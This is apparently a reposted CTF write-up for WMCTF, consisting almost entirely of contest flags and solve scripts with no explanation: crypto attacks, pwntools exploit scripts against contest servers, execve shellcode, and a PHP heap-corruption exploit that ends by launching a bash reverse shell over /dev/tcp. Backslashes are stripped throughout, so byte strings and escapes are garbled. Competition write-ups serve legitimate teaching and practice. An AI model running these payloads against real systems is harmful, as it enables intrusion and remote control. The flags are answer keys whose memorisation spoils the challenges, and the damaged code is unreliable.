# WMCTF-WriteUp

> 原文: https://www.ctfiot.com/1224.html
> ID: 1224

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
WMCTF{x1aoma0_wants_a_girlfriend}
WMCTF{L1near_has_double_girlfriends}
# encoding:
utf-8
import base64
from Crypto.Cipher import AES
from Crypto import Random

def decrypt(data, password):
    bs = AES.block_size
    if len(data) <= bs:
        return data
    unpad = lambda s : s[0:-ord(s[-1])]
    iv = data[:bs]
    cipher = AES.new(password, AES.MODE_CBC, iv)
    data  = unpad(cipher.decrypt(data[bs:]))
    return data
 
if __name__ == '__main__':
    v2x = open("v2x_misc.conf","r")
    data = v2x.read() 
    password = 'x89x86x09x18x70x03x19x83x96x32'.ljust(0x20,"x00") #16,24,32位长的密码
    decrypt_data = decrypt(data, password)
    print 'decrypt_data:', decrypt_data
flag=wmctf{tb0x_s3curity_is_fun}
WMCTF{wow_a_great_pa1nter!~~}
# 作者: Dawn_whisper
# 链接: https://dawn-whisper.hack.best/2021/04/04/Wp_for_%E7%BA%A2%E6%98%8E%E8%B0%B7_crypto/
# 来源: Dawn_whisper's blog
# 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

from Crypto.Util.number import *
from pwn import *
import os
from base64 import *

from pwnlib.util.iters import mbruteforce
from hashlib import sha256
context.log_level = 'debug'

def proof_of_work(sh):
    sh.recvuntil("XXXX+")
    suffix = sh.recvuntil(')').decode("utf8")[:-1]
    log.success(suffix)
    sh.recvuntil("== ")
    cipher = sh.recvline().strip().decode("utf8")
    proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed')
    sh.sendlineafter("Plz tell me XXXX:", proof)

r=remote("47.104.243.99","10001")
proof_of_work(r)

def times2(input_data,blocksize = 16):
    assert len(input_data) == blocksize
    output =  bytearray(blocksize)
    carry = input_data[0] >> 7
    for i in range(len(input_data) - 1):
        output[i] = ((input_data[i] << 1) | (input_data[i + 1] >> 7)) % 256
    output[-1] = ((input_data[-1] << 1) ^ (carry * 0x87)) % 256
    assert len(output) == blocksize
    return output

def times3(input_data):
    assert len(input_data) == 16
    output = times2(input_data)
    output = xor_block(output, input_data)
    assert len(output) == 16
    return output

def back_times2(output_data,blocksize = 16):
    assert len(output_data) == blocksize
    input_data =  bytearray(blocksize)
    carry = output_data[-1] & 1
    for i in range(len(output_data) - 1,0,-1):
        input_data[i] = (output_data[i] >> 1) | ((output_data[i-1] % 2) << 7)
    input_data[0] = (carry << 7) | (output_data[0] >> 1)
    # print(carry)
    if(carry):
        input_data[-1] = ((output_data[-1] ^ (carry * 0x87)) >> 1) | ((output_data[-2] % 2) << 7)
    assert len(input_data) == blocksize
    return input_data

def xor_block(input1, input2):
    assert len(input1) == len(input2)
    output = bytearray()
    for i in range(len(input1)):
        output.append(input1[i] ^ input2[i])
    return output

def hex_to_bytes(input):
    return bytearray(long_to_bytes(int(input,16)))

    #context(log_level='debug')
    #r=remote("0.0.0.0","10002")

def Arbitrary_encrypt(msg):
    # to get aes.encrypt(msg)

    num = bytearray(os.urandom(16))
    # encrypt "x00"*15+"x80"+"x00"*16
    r.recvuntil("[-] ")
    r.sendline("1")
    r.recvuntil("[-] ")
    r.sendline(b64encode(num))
    r.recvuntil("[-] ")
    m = bytearray(b"x00"*15 + b"x80" + b"x00"*16)
    r.sendline(b64encode(m))
    r.recvuntil("ciphertext: ")
    cipher = b64decode(r.recvline(False))
    r.recvuntil("tag: ")
    tag = b64decode(r.recvline(False))

    # decrypt to solve L=E(nonce)
    r.recvuntil("[-] ")
    r.sendline("2")
    r.recvuntil("[-] ")
    r.sendline(b64encode(num))
    r.recvuntil("[-] ")
    m0 = bytearray(b"x00"*15 + b"x80")
    m1 = bytearray(b"x00"*16)
    c0 = cipher[:16]
    r.sendline(b64encode(xor_block(c0,m0)))
    r.recvuntil("[-] ")
    c1 = cipher[16:]
    r.sendline(b64encode(c1))
    r.recvuntil("[-] ")
    r.sendline("")
    r.recvuntil("[+] plaintext: ")
    enc = xor_block(bytearray(b64decode(r.recvline(False))),m0)

    L = back_times2(enc)
    LL = enc
    LLL = xor_block(LL,c0)
    # print(L)
    # print(LL)
    # print(LLL)
    # L=L 2L=LL L'=LLL m0=m0
    msg = bytearray(msg)

    # encrypt msg
    r.recvuntil("[-] ")
    r.sendline("1")
    r.recvuntil("[-] ")
    r.sendline(b64encode(xor_block(LL,m0)))
    r.recvuntil("[-] ")
    r.sendline(b64encode(xor_block(msg,times2(LLL))+m1))
    r.recvuntil("ciphertext: ")
    enc = bytearray(b64decode(r.recvline(False))[:16])
    r.recvline()
    return xor_block(enc,times2(LLL))

def my_pmac(header, blocksize = 16):
    assert len(header)
    m = int(max(1, math.ceil(len(header) / float(blocksize))))
    offset = Arbitrary_encrypt(bytearray([0] * blocksize))
    offset = times3(offset)
    offset = times3(offset)
    checksum = bytearray(blocksize)
    for i in range(m - 1):
        offset = times2(offset)
        H_i = header[(i * blocksize):(i * blocksize) + blocksize]
        assert len(H_i) == blocksize
        xoffset = xor_block(H_i, offset)
        encrypted = Arbitrary_encrypt(xoffset)
        checksum = xor_block(checksum, encrypted)
    offset = times2(offset)
    H_m = header[((m - 1) * blocksize):]
    assert len(H_m) <= blocksize
    if len(H_m) == blocksize:
        offset = times3(offset)
        checksum = xor_block(checksum, H_m)
    else:
        H_m.append(int('10000000', 2))
        while len(H_m) < blocksize:
            H_m.append(0)
        assert len(H_m) == blocksize
        
        checksum = xor_block(checksum, H_m)
        offset = times3(offset)
        offset = times3(offset)
    final_xor = xor_block(offset, checksum)
    auth = Arbitrary_encrypt(final_xor)
    return auth

def my_ocb_encrypt(plaintext, header, nonce, blocksize = 16):
    assert nonce
    m = int(max(1, math.ceil(len(plaintext) / float(blocksize))))
    offset = Arbitrary_encrypt(nonce)
    checksum = bytearray(blocksize)
    ciphertext = bytearray()
    for i in range(m - 1):
        offset = times2(offset)
        M_i = plaintext[(i * blocksize):(i * blocksize) + blocksize]
        assert len(M_i) == blocksize
        checksum = xor_block(checksum, M_i)
        xoffset = Arbitrary_encrypt(xor_block(M_i, offset))
        ciphertext += xor_block(offset, xoffset)
        assert len(ciphertext) % blocksize == 0
    M_m = plaintext[((m - 1) * blocksize):]
    offset = times2(offset)
    bitlength = len(M_m) * 8
    assert bitlength <= blocksize * 8
    tmp = bytearray(blocksize)
    tmp[-1] = bitlength
    pad = Arbitrary_encrypt(xor_block(tmp, offset))
    tmp = bytearray()
    C_m = xor_block(M_m, pad[:
len(M_m)])
    ciphertext += C_m
    tmp = M_m + pad[len(M_m):]
    assert len(tmp) == blocksize
    checksum = xor_block(tmp, checksum)
    offset = times3(offset)
    tag = Arbitrary_encrypt(xor_block(checksum, offset))
    if len(header) > 0:
        tag = xor_block(tag, my_pmac(header))
    return (tag, ciphertext)

pmac_admin = my_pmac(bytearray(b'from admin'))

finalnonce = bytearray(b'x00'*16)
r.recvuntil("[-] ")
r.sendline("3")
r.recvuntil("ciphertext: ")
cipher = b64decode(r.recvline(False))
r.recvuntil("tag: ")

tag = r.recvline(False)
print("tag:",tag)
tag = b64decode(tag)

print("tag:",tag)
print("adminass",pmac_admin)
r.recvuntil("[-] ")
r.sendline("2")
r.recvuntil("[-] ")
r.sendline(b64encode(finalnonce))
r.recvuntil("[-] ")
r.sendline(b64encode(cipher))
r.recvuntil("[-] ")

r.sendline(b64encode(xor_block(tag, pmac_admin)))
r.recvuntil("[-] ")
r.sendline("")
r.recvuntil("[+] plaintext: ")
r.interactive()
import string
from hashlib import sha256
from Crypto.Util.number import *
from Crypto.Random import random

# flag = b'flag{123456}'
# flag_bin = bin(bytes_to_long(flag))[2:].rjust(8*len(flag),'0')
# print((flag_bin))
n = 32
nbits = 52
a=[]
elements='''97005071980911
32652300906411
73356817713575
108707065719744
103728503304990
49534310783118
53330718889073
2121345207564
46184783396167
115771983454147
64261597617025
2311575715655
56368973049223
84737125416797
24316288533033
82963866264519
101019837363048
25996629336722
41785472478854
68598110798404
40392871001665
94404798756171
54290928637774
112742212150946
91051110026378
124542182410773
40388473698647
22059564851978
57353373067776
80692115733908
84559172686971
28186390895657'''.split("n")

s = 1620418829165478
# for i in range(96):
#  if flag_bin[i] == '1':
#   s += elements[i]

    #print(elements)
    #print(s)
    #print(len(elements))
for each in elements:
    a.append(int(each))
    #a = elements
 

m=[]
for i in range(32):
    b=[]
    for j in range(32):
        if i == j:
            b.append(2)
        else:
            b.append(0)
    m.append(b)

b=[]
for i in range(32):
    m[i].append(2**333*a[i])
    b.append(1)

b.append(2**333*s)
m.append(b)
    #print(len(m[0])) 
M = matrix(ZZ, m)
v = M.BKZ(blocksize = 22)
    #v = M.LLL()
for each in v:
 for i in each:
  if i != -1 and i != 0 and i!=1:
   break
 else:
  print(each)
  break
res = ''
for i in each:
 if i==-1:
  res+='1'
 elif i==1:
  res+='0'
    #print(flag_bin)
print(res)
from sympy import root,isprime
from Crypto.Util.number import *

x0=2255716889021285783693130969553811222189658026589842993545376032496945548
2440478818214881238008049099359205018904340768471472428920317356150638921849
0935705296364953536182758793291048365673580593450536031914660696774110204972
4883828324326559788828665799662057532387687702395651633219172532219262950240
2586824044489363683047070221327695805664436384402248642084189359319936535607
9656756241152330683806040610781444138374139316124652021727020497664436286588
3577719877386019128329934191205583907344728729278813565264049218544183332044
9963153567219692534113271464184088407868563546901051172705876316085609921101
9480321212651
x1=3090432639272092490480009577215420364621035649025890437411229304744877891
8108485874368782620417444795360391203864853838031422142105664266455483186096
5357098306068163516058369141628669652500666523370105440935176197703110323535
1388306406948575188283535221730812982979504982378632195824923694097249234044
6696711377706657021352179791577502550535198370607684079796961486194204601811
5966664558956289734849028950716009507862117781679690963369478220298118899337
4895565152455765232809080498919729787224561450276898111502167376761950369457
4171694344892029982217088827905880124571069853312811370624008885111784799879
7295836847717
x2=3416715458736181898853086313385890417623381947973129599119307779274500866
3636908683851274845066651407138469940191588531131537269757514384072625022249
9954126749402934771840900453531367222954980965274860792990055382309558718653
5256784383548433685183611335068925636606658576920737485826836110700103165004
4374024297085227171950608375692641395489828709104264004909353945556498841953
0757529654737512821347840059016138010820365392750279603293153114790902291484
3210319178836550081055319403714920267444171300128607892821319148582712803199
0263865369098554451271748713342909451803394368263302936578242285630992289054
7216422508737
x3=4780984075284732242217051539586480795675999938598046565321889298075943016
9588872414984375765252254483814857795656871076072774029999454498713514751943
2361429999148826231249834523445563422596606382092259490842235739456455647320
1848940721361522155890165075154984590911633065039761708502827060950056777638
6610632042873486902751073657805628149670012908529643685674193252043228524097
1950449077579625154472591067541214557459921547680020758614659450985233974661
6399084160427354057358089316310727800246522582524100469938105522358856452009
0270225243414834051540658370146096079035052506046413560865211052210210428627
7789935904903
x4=3679489730723031096598492105827728129810765418493122546424785807187989219
4116245522370205719240819031528529285765677397231324995937767007474352008738
0277286862529412578257947586668348051436046509947883011635576842954359675859
4901544313800871867589174124376804822524897797441804129975082150272033750417
9266329979195546452206733583016527070132930762152351309147089905277635012984
7178357145651389812636928056493624143188546011100041708667795453244527315156
6016618369561096559092414361507108756521641240165754724756029045466105733834
4268214868249504763335859530634001817938202838884107605218842943629289519501
2001783593519
e=65537
c=10245053910079956247099793591079692215121401157261026838312860473026439570
0869450349505582519098027407267381039039352455394070624426286301263102694996
2656257219140155180870062674780125267594883969543914738465878908552788117176
4877231781809174077880229310086892226831888572391698586614827829530664711631
1472264557212493482815771369594401429835665546739545527993557278602896021537
5368746966294131269206833337159914452547725411147428067205238678680666585175
1541355972131001390246687525621513263377314924193326575041133963175097745752
4804630192827800288207709456655384547197597848639573097956038549501979299161
502319980182

    #e=65537
    #c=95857573663836096013243004431952412877419779317732090380731653197980204933780968944661176700010054538833188182703044818101919942674341121447924734777821195138761782278570425764239283771075159979235635028638965125062172591695779260880774787249949756244088963035926570334613072704954681800870331243775380910742874859055506480989468748696087590528813623386820198372777167510541737050411695494177414364007839184828166152558350634227403036975757248958522877076489168209265501077263908724367740830840367404825086797664611906236866519634289564793359430466999986174394547963750712007179612015266852267317301339700209735846634

N = x0

x0 = int(root(x0,2))
x1 = int(root(x1,2))
x2 = int(root(x2,2))
x3 = int(root(x3,2))
x4 = int(root(x4,2))

B = matrix(ZZ,[[2^368,x1,x2,x3,x4],[0,-x0,0,0,0],[0,0,-x0,0,0],[0,0,0,-x0,0],[0,0,0,0,-x0]])
L = B.LLL()
ans= L[0][0] // 2^368

p0 = abs(ans)
a = x0 // p0

pbar = a^2
ZmodN = Zmod(N)
P.<x> = PolynomialRing(ZmodN)
f = pbar + x
x0 = f.small_roots(X=2^369, beta=0.4,epsilon = 0.01 )[0]
p =  pbar + x0
print("p: ", p)

p=int(p)
N=int(N)
q=N//p
d=inverse(e,(p-1)*(q-1))
print(long_to_bytes(pow(c,d,N)))
from Crypto.Util.number import *

p = 496584754781581997154645314415051021632937719346451955222548277806458479939882609131615548616817732786901123585586203791585231652481101508165523306207307511005218236201069837205145881515297396218450658339325435517394532697652694250302927324547950654199907918057947165277944713164863611463887879016367147027651
e = 4096
c = 202821697585498721190880385651888326819052363235092021514522019296117832067188656931773131985516119359273814956340533509702817980744398402155886334655033938474295749168241550740096583920405311629354495691732306096266636370938656838375279086916114964255411601403125984312042419408682006688199111243135798564394
C = c

tmp=[c]
for i in range(1,13):
 tmp_new=[]
 for c in tmp:
  m = pow(c,(p+1)//4,p)
  tmp_new.append(m)
  tmp_new.append(p-m)
  #print(i)
  assert pow(m,2**i,p) == C
 print(len(tmp_new))
 tmp=tmp_new

for each in tmp:
 each = long_to_bytes(each)
 if 'WMCTF' in each:
  print each
from pwn import *
from itertools import product
from Crypto.Util.number import bytes_to_long,long_to_bytes
from hashlib import sha256
import string
# context.log_level = "debug"
# server = process(["python3","task.py"])
ip = "47.104.243.99"
# ip = "127.0.0.1"
port = 31923
# port = 9999
io = remote(ip,port)
import os

def getrandbits(n):
    return bytes_to_long(os.urandom(n // 8+1)) >> (8-n%8)

def PoW():
    io.recvuntil("sha256(XXXX+")
    suffix = io.recv(16).decode()
    io.recvuntil("== ")
    target = io.recvline().strip().decode()
    poss = string.ascii_letters+string.digits
    for cur in product(poss,repeat=4):
        guess = "".join(cur)
        if sha256((guess+suffix).encode()).hexdigest() == target:
            print("find! ",guess)
            io.sendlineafter("Give me XXXX: n",guess)
            break
def to_vec(num , length):
    vec = []
    while length > 0:
        vec = [num % q] + vec
        num //= q
        length -= 1
    return vec

def to_mat(numlist):
    M =[]
    for i in numlist:
        M.append(to_vec(i,40))
    return M
PoW()
n = int(io.recvline().decode().strip())
e = int(io.recvline().decode().strip())
io.recvuntil("two chances.n")

io.recvline().decode().strip()
for i in range(15):
    payload = pow(2,e,n)
    io.sendlineafter("key", str(payload))
io.recvuntil("cipher:")
cipher2 = eval(io.recvline().decode().strip())

f0_c = int(io.recvline().decode().strip())
M = []
for i in range(15):
    m = int("1"*20+'0'*460,2)+getrandbits(460)
    m += m<<480
    M.append(m)
    payload = pow(m,e,n)
    io.sendlineafter("key",str(payload))
io.recvuntil("cipher:")
cipher = eval(io.recvline().decode().strip())
f0 = 0
q = 2**24
for i in range(20):
    cur = (cipher[20+i] - cipher[i])%q
    f0 |= cur
    f0 <<= 24
f0 >>= 24
_f0 = (f0<<480)|f0
raw_key = [m-_f0 for m in M]
key = to_mat([f0]+raw_key)

# print(key)
# print(cipher)
from sage.all import *
F = Zmod(2**24)
K = Matrix(F,key)
c = vector(F,cipher)
res = K.solve_left(c)
ans = " ".join([str(i) for i in res])
print(ans)
io.sendlineafter("do you know the secret?n",ans)
io.interactive()
# -*- coding: UTF-8 -*- 
from pwn import *
context.arch = 'amd64'
p = remote("47.104.169.32", 12233)
def exe(name):
 p.sendlineafter(">>", "3")
 if name == 1:
  name = "redflag"
 else:
  name = "?"
 p.sendline(name)
def trace(id, offset, data):
 p.sendline("4")
 p.sendline("%s %s %s"%(str(id), str(offset), str(data)))

shellcode = "x48xb8x2fx62x69x6ex2fx73x68x00x50x48x89xe7x48x31xf6x48x31xd2x48xc7xc0x3bx00x00x00x0fx05"
print len(shellcode)
for i in range(0x888):
 exe(1)
exe(2)
for i in range(4):
 trace(0x777, 8*i, u64(shellcode[i*8:8+i*8].ljust(8, "x00")))
 print i
p.interactive()
<?php
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    function get_bytes($idx, $offset, $cnt){
        $address = 0;
        $i = 0;
        for($i = $cnt-1; $i >= 0; --$i) {
            $tmp = ord(wm_get_byte($idx, $offset+$i));
            $address <<= 8;
            $address |= $tmp;
        }
        return $address;
    }
    function edit_bytes($idx, $offset, $cnt, $data){
        $address = 0;
        $i = 0;
        for($i = 0; $i < $cnt; ++$i) {
            $tmp = $data & 0xff;
            wm_edit_byte($idx, $offset+$i, $tmp);
            $data >>= 8;
        }
    }
    class Lucky{
      public    $a0, $a1;
   }
    $str = str_repeat('B', (0x100));
    welcome_to_wmctf();
    wm_add(4, $str);
    wm_add(0, $str);
    $str1 = str_repeat('B', (0x47));
    wm_edit(0, $str1);
    $lucky = new Lucky();
    $lucky->a0 = "aaaaaaa";
    $lucky->a1 = function ($x) { };
    $object_addr = get_bytes(0, 0x88, 8);
    $elf_addr = get_bytes(0, 0x68, 8)-0xa6620-0x1159000;
    echo "object_addr ==> 0x".dechex($object_addr)."n";
    echo "elf_addr ==> 0x".dechex($elf_addr)."n";
    wm_add(1, $str);
    wm_edit(1, "A");
    edit_bytes(1, 8, 8, $object_addr);
    wm_add(2, "A");
    wm_add(3, $str);
    wm_edit(3, ptr2str(1, 1));
    for($i = 0; $i < 0x100; $i+=8){
        $tmp = get_bytes(3, $i, 8);
        edit_bytes(4, $i, 8, $tmp);
    }
    edit_bytes(0, 0x88, 8, $object_addr-0x140);
    edit_bytes(4, 0x70, 8, $elf_addr+0x429470);
    edit_bytes(4, 0x38, 4, 1);
    $cmd = 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"x00';
    ($lucky->a1)($cmd);
?>
from Crypto.Cipher import ARC4
cmp = [24, 118, 235, 135, 118, 62, 119, 8, 192, 141, 86, 37, 158, 53, 13, 22, 35, 101, 97, 106, 20, 157, 79, 28, 100, 33, 125, 120, 186, 83, 145, 34]
cmp = [_ ^ 0x50 for _ in cmp]
r_key = b"Hello from C++"
rc4 = ARC4.new(r_key)
p1 = list(rc4.decrypt(bytes(cmp)))
#[208, 96, 247, 198, 149, 66, 34, 253, 227, 107, 126, 156, 161, 201, 216, 250, 207, 130, 200, 118, 248, 203, 124, 111, 248, 127, 153, 90, 18, 98, 198, 182]
s = [位于0x35860的256字节]
inv_box = [0] * 256                         
for i in range(16):                         
  for j in range(16):                     
     val = s[i*16 + j]               
     ti = val >> 4                   
     tj = val & 0b1111               
     inv_box[16*ti + tj] = i << 4 | j
    #include <cstdio>
    #include "aes.hpp"

int main() {
    uint8_t key[] = { 84, 114, 97, 99, 101, 114, 80, 105, 100, 58, 9, 48, 10, 102, 108, 103 };
    uint8_t iv[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    uint8_t in[] = { 208, 96, 247, 198, 149, 66, 34, 253, 227, 107, 126, 156, 161, 201, 216, 250, 207, 130, 200, 118, 248, 203, 124, 111, 248, 127, 153, 90, 18, 98, 198, 182 };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, in, 32);
    
    printf("%s", (char*)in);
}
wmctf{e78ce1a3ac4be37a96e27e98c}
from z3 import *
s = Solver()
key = [BitVec('x%d'%i, 32) for i in range(4)]
s.add((key[0]+key[1]) == 0x11AB7A7A)
s.add(key[1]-key[2] == 0x1CD4F222)
s.add(key[2]+key[3] == 0xC940F021)
s.add(key[0]+key[2]-key[3] == 0x7C7D68D1)
if s.check() == sat:
    m = s.model()
    m = [m[key[i]].as_long() for i in range(4)]
    print(m)
else:
    print('Not Found!')
    #include <stdio.h>
unsigned int box[256];
char res[5];
int number[] = {0x100, 0x100, 0xf, 0x1c};
unsigned enc[] = {2750330814, 1841087164, 1357369498, 2019106695};
void gen_box(){
  unsigned int j; // [rsp+4h] [rbp-Ch]
  unsigned int i; // [rsp+8h] [rbp-8h]
  unsigned int v3; // [rsp+Ch] [rbp-4h]
  for ( i = 0; i < 0x100; ++i ){
    v3 = i;
    for ( j = 0; j < 8; ++j ){
      if ( (v3 & 1) != 0 )
        v3 = (v3 >> 1) ^ 0x8320EDB8;
      else  v3 >>= 1;
    }
    box[i] = v3;
  }
}
unsigned int fun1(unsigned int a1, unsigned char a2[256], unsigned int a3){
    unsigned int v4; // [rsp+4h] [rbp-1Ch]
    unsigned int v5; // [rsp+8h] [rbp-18h]
    
    v5 = 0;
    v4 = a1;
    while ( v5 < a3 )
        v4 = (v4 >> 8) ^ box[(unsigned char)(a2[v5++] ^ v4)];
    return a1 ^ v4;
}
unsigned int bp(int up, int number, unsigned int pre, unsigned int next){
    for(int i = 0; i < 127; i++){
        unsigned char block[256];
        for(int j = 0; j < number; j++){
            block[j] = i+j+up;
        }
        
        if(fun1(pre, block, number) == next)
            return i;    
    }    
}
int main(void){
    gen_box();   
    for(int i = 0; i < 4; i++){
        if(i == 0)
            res[i] = bp(i, number[i], -2, enc[i]);
        else
            res[i] = bp(i, number[i], enc[i-1], enc[i]);
    }
    
    puts(res);    
}
//Hah4
    #include <stdio.h>
    #include <stdint.h>
    #include <stdlib.h>
unsigned int get_delat()
{
    int i = 0;
    unsigned int ans = 0, delat = 0x667E5433;
    
    for(i = 0; i < 32; i++)
        ans -= delat;
    
    return ans;
}
void decrypt1(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])
{  
    unsigned int i;  
    uint32_t v0 = v[0], v1 = v[1], delta = 0x667E5433, sum = get_delat();
    //printf("%x", sum);  
    for(i = 0; i < num_rounds; i++)
    {  
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);  
        sum += delta;  
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);  
    }  
    v[0]=v0, v[1]=v1;  
}
int check(unsigned a)
{
    for(int i = 0; i < 4; i++)
    {
        if(((char *)&a)[i] < 32 || ((char *)&a)[i] > 127)
            return 0;
    }
    
    return 1;
}
int main(void)
{
    //['a3eeb7be', '6dbcc2bc', '50e7d09a', '78591f87']
    
    uint32_t k[4]={0x78591FAD, 0x6DBCC2BC, 0xA3EEB7BE, 0x50E7DE9A};
    for(int i = 10; i < 0xff; i++)
    {
        for(int j = 0; j < 0xff; j++)
        {
            uint32_t v[2]={0x1989FB2B, 0x83F5A243};
            k[3] &= 0xFFFF00FF;
            k[3] |= i << 8;
            k[0] &= 0xFFFFFF00;
            k[0] |= j;
            
            unsigned int r=32;
            decrypt1(r, v, k);
                
            if(check(v[0]) && check(v[1]))
            {
                for(int k = 0; k < 8; k++)
                {
                    printf("%c", ((char *)v)[k]);
                }
                printf(" %x %x", i, j);
                putchar(10);
            }
        }
    }
    return 0;  
}
/*
pWRTPO{> 13 9f
<<R|CJA< 24 c7
o{2%lSf 28 7f
t<o.:
RMY 2d 69
b%AGkVTt 36 2d
e.xQVP!| 53 0
0bOMoJI8 54 b1
"pWU3*@+ 73 d2
>]zSE>?d 81 d7
(sqF m
# 8a 6b
Z,wRg8T_ 92 76
yOu_L1kE b7 ad
!vta&K]M ba d3
K?Gl@~Rw bf b5
1C ="`~p c3 71
?&bqWg]_ cd b1
SX|6u|v f4 43
+zWv6`!C fb a2
*/
WMCTF{Hah4_D0_yOu_L1kE_It!@FFFE#0F20-11B7}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/2-1634875302.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/6-1634875302.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/9-1634875303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/1-1634875303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/6-1634875303.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/10-1634875304.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/5-1634875304.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/5-1634875304.jpeg)